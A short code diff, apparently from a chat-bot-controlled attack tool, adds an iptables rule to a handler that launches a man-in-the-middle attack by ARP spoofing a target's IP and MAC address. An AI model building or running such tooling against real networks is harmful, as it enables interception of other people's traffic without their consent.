@@ -400,6 +400,7 @@ def msg_mitm(bot, update, args):
     ID = attackManager("new", attack_type="mitm", target=target_ip)
 
     target = [target_ip, target_mac]
+    iptables("mitm", target=target[0])
     arp_thread = threading.Thread(target=arpSpoof, args=[target, ID, "mitm"])
     arp_thread.daemon = True
     arp_thread.start()
